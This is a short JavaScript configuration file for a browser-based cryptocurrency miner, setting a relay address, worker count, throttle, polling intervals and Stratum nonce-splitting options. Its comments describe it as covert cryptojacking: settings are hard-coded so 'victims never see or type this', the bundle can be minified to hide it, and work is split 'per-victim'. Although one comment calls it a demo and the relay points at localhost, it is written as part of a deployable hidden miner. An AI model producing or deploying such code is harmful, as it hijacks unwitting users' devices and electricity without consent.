/**
 * Production-like: hard-code relay and workers here; victims never see or type this.
 * Change before deploy; can be minified or merged into one bundle.
 */
(function (g) {
  g.__MINER_CFG = {
    relay: "http://127.0.0.1:3001",
    /** Max load in this demo: workers 1–4, throttle 1–10 (higher = more nonces/batch, less sleep). */
    workers: 4,
    throttle: 10,
    jobPollMs: 20000,
    waitAttempts: 60,
    waitIntervalMs: 2000,
    /**
     * Per-victim extranonce2: if non-empty, extranonce2 is derived deterministically from userId + job (Stratum uses extranonce2 to split search space).
     */
    userId: "",
    /**
     * Split 32-bit nonce space into nonceSegmentCount slices; this client scans slice nonceSegmentIndex (0-based).
     * Use 1 for no split (full uint32 ring with worker stride).
     */
    nonceSegmentIndex: 0,
    nonceSegmentCount: 1,
  };
})(typeof self !== "undefined" ? self : this);
